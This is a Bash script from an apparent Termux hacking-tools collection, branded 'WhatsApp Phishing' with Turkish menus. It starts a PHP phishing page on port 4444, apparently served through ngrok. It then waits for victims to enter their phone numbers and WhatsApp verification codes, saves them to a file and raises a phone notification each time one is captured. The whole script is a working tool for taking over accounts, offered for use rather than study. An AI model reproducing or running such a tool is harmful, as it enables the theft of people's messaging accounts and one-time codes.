#!/bin/bash
clear
#################### GÜNLER ####################

pazartesi=$(date |grep -o Mon)
sali=$(date |grep -o Tue)
carsamba=$(date |grep -o Wed)
persembe=$(date |grep -o Thu)
cuma=$(date |grep -o Fri)
cumartesi=$(date |grep -o Sat)
pazar=$(date |grep -o Sun)

#################### GÜNLERE GÖRE RENKLER ####################

if [[ $pazartesi == Mon ]];then
	color='\e[32m'
elif [[ $sali == Tue ]];then
	color='\e[33m'
elif [[ $carsamba == Wed ]];then
	color='\e[34m'
elif [[ $persembe == Thu ]];then
	color='\e[31m'
elif [[ $cuma == Fri ]];then
	color='\e[36m'
elif [[ $cumartesi == Sat ]];then
	color='\e[32m'
elif [[ $pazar == Sun ]];then
	color='\e[33m'
fi

#################### BANNER ####################

printf "
\e[97m



　 　    ▒█░░▒█ ▒█░▒█ ░█▀▀█ ▀▀█▀▀ ▒█▀▀▀█ ░█▀▀█ ▒█▀▀█ ▒█▀▀█ 
  　  　 ▒█▒█▒█ ▒█▀▀█ ▒█▄▄█ ░▒█░░ ░▀▀▀▄▄ ▒█▄▄█ ▒█▄▄█ ▒█▄▄█ 
　    　 ▒█▄▀▄█ ▒█░▒█ ▒█░▒█ ░▒█░░ ▒█▄▄▄█ ▒█░▒█ ▒█░░░ ▒█░░░ 
$color

　   　    ▒█▀▀█ ▒█░▒█ ▀█▀ ▒█▀▀▀█ ▒█░▒█ ▀█▀ ▒█▄░▒█ ▒█▀▀█ 
　 　   　 ▒█▄▄█ ▒█▀▀█ ▒█░ ░▀▀▀▄▄ ▒█▀▀█ ▒█░ ▒█▒█▒█ ▒█░▄▄ 
　      　 ▒█░░░ ▒█░▒█ ▄█▄ ▒█▄▄▄█ ▒█░▒█ ▄█▄ ▒█░░▀█ ▒█▄▄█ 
                        

         \e[1;97m+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
              $color C O D E D   B Y   U M U T   K A R A
         \e[97m+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
	 \e[97m+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
	          $color T E R M U X X   T O O L S S
  	 \e[0;97m+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
	     +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
	         +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
		     +-+-+-+-+-+-+-+-+-+-+-+
		         +-+-+-+-+-+-+-+
			     +-+-+-+
			       +-+
			        +

\e[0m

\e[31m[\e[97m1\e[31m]\e[97m ────────── \e[32mHACKİNG ATTACK\e[97m

\e[31m[\e[97mG\e[31m]\e[97m ────────── \e[33mGERİ\e[97m

\e[31m[\e[97mX\e[31m]\e[97m ────────── \e[31mÇIKIŞ\e[97m
"
echo
echo
echo
function finish() {
	kontrol=$(ps aux |grep "ngrok" |grep -v grep |grep -o ngrok)
	if [[ $kontrol == ngrok ]];then
		killall ngrok
		killall php
	fi
	exit
}
stty susp ""
stty eof ""
trap finish SIGINT
dongu2() {
while :
do
	if [[ -a kod.txt ]];then
		echo
		echo
		echo
		printf "\e[32m$(cat kod.txt)\e[97m"
		echo
		echo
		echo
		cat kod.txt >> kaydedilen.txt
		rm kod.txt
		termux-notification -t WHATSAPP_PHİSHİNG -c "[✓] KOD GİRİLDİ"
		exit
	fi
done

}
dongu() {
while :
do
	if [[ -a numara.txt ]];then
		echo
		echo
		echo
		printf "\e[32m$(cat numara.txt)\e[97m"
		echo
		echo
		echo
		cat numara.txt >> kaydedilen.txt
		rm numara.txt
		termux-notification -t WHATSAPP_PHİSHİNG -c "[✓] NUMARA GİRİLDİ"
		dongu2
	fi
done
}
kapali() {
cat kaydedilen.txt > .sayi.txt
kontrol2=$(cat .sayi.txt |wc -l)
while :
do
	kontrol=$(cat kaydedilen.txt |wc -l)
	if [[ $kontrol != $kontrol2 ]];then
		echo
		echo
		echo
		printf "\e[32m$(cat kaydedilen.txt)\e[97m"
		echo
		echo
		echo
		termux-notification -t WHATSAPP_PHİSİNG -c "[✓] BİLGİ GİRİLDİ"
		exit
	fi
done
}
bulunan() {
if [[ -a kaydedilen.txt ]];then
	echo
	echo
	echo
	printf "\e[32m$(cat kaydedilen.txt)\e[97m"
	echo
	echo
	echo
	read -e -p $'\e[97mKAYDEDİLEN ESKİ DOSYA SİLİNSİN Mİ ?\e[31m ────────── \e[97m[ \e[32mE \e[97m/\e[31m H\e[97m ] >>\e[97m ' sec
	if [[ $sec == e || $sec == E ]];then
		rm kaydedilen.txt
		echo
		echo
		echo
		printf "\e[32m[✓]\e[97m SİLME İŞLEMİ TAMAMLANDI"
		echo
		echo
		echo
		read -e -p $'\e[97mDEVAM ETMEK İSTİYOR MUSUN ?\e[31m ────────── \e[97m[ \e[32mE \e[97m/\e[31m H\e[97m ] >>\e[97m ' secim
		if [[ $secim == e || $secim == E ]];then
			sleep 1
		elif [[ $secim == h || $secim == H ]];then
			echo
			echo
			echo
			printf "\e[33m[*]\e[97m İŞLEM İPTAL EDİLDİ"
			echo
			echo
			echo
			sleep 2
			cd ..
			bash whatsapp_phishing.sh
			exit
		else
			echo
			echo
			echo
			printf "\e[31m[!]\e[97m HATALI SEÇİM"
			echo
			echo
			echo
			sleep 2 
			cd ..
			bash whatsapp_phishing.sh
			exit

		fi
	elif [[ $sec == h || $sec == H ]];then
		echo
		echo
		echo
		printf "\e[31m[!]\e[97m SİLME İŞLEMİ İPTAL EDİLDİ"
		echo
		echo
		echo
		echo
		sleep 1
		bash index.sh -bg -p 4444
		echo
		echo
		echo
		printf "\e[33m[*]\e[97m LİNKE GİRDİ OLURSA BİLDİRİM İLE HABER VERİLECEK"
		echo
		echo
		echo
		printf "BAĞLANTIYI KESMEK İÇİN \e[31m>> \e[97m[\e[31m CTRL C \e[97m]"
		echo
		echo
		echo
		dongu
		
	else
		echo
		echo
		echo
		printf "\e[31m[!]\e[97m HATALI SEÇİM"
		echo
		echo
		echo
		sleep 2
		cd ..
		bash whatsapp_phishing.sh
		exit
	fi
fi
}
read -e -p $'\e[31m───────[ \e[97mSEÇENEK GİRİNİZ\e[31m ]───────►  \e[0m' secim
if [[ $secim == 1 ]];then
	cd files
	bulunan
	bash index.sh -bg -p 4444
	echo
	echo
	echo
	printf "\e[33m[*]\e[97m LİNKE GİRDİ OLURSA BİLDİRİM İLE HABER VERİLECEK"
	echo
	echo
	echo
	printf "BAĞLANTIYI KESMEK İÇİN \e[31m>> \e[97m[\e[31m CTRL C \e[97m]"
	echo
	echo
	echo
	dongu
elif [[ $secim == k || $secim == K ]];then
	kontrol=$(ps aux |grep "ngrok" |grep -v grep |grep -v index |awk '{print $2}' |wc -l)
	if [[ $kontrol == 1 ]];then
		killall php
		killall ngrok
		echo
		echo
		echo
		printf "\e[32m[✓] \e[33mPHP & NGROK\e[97m ARKAPLANDAN KAPATILDI"
		echo
		echo
		echo
		sleep 2
		bash whatsapp_phishing.sh
	else
		echo
		echo
		echo
		printf "\e[31m[*] \e[33mPHP & NGROK\e[97m ARKAPLANDA ÇALIŞMIYOR"
		echo
		echo
		echo
		sleep 2
		bash whatsapp_phishing.sh
		exit
	fi
elif [[ $secim == g || $secim == G || $secim == .. ]];then
	cd ../..
	bash phishing-attack.sh
elif [[ $secim == x || $secim == X ]];then
	echo
	echo
	echo
	printf "\e[31m[!]\e[97m ÇIKIŞ YAPILDI\e[31m !!!\e[0m"
	echo
	echo
	echo
	exit
else
	echo
	echo
	echo
	printf "\e[31m[!]\e[97m HATALI SEÇİM\e[0m"
	echo
	echo
	echo
	sleep 2
	bash whatsapp_phishing.sh
fi
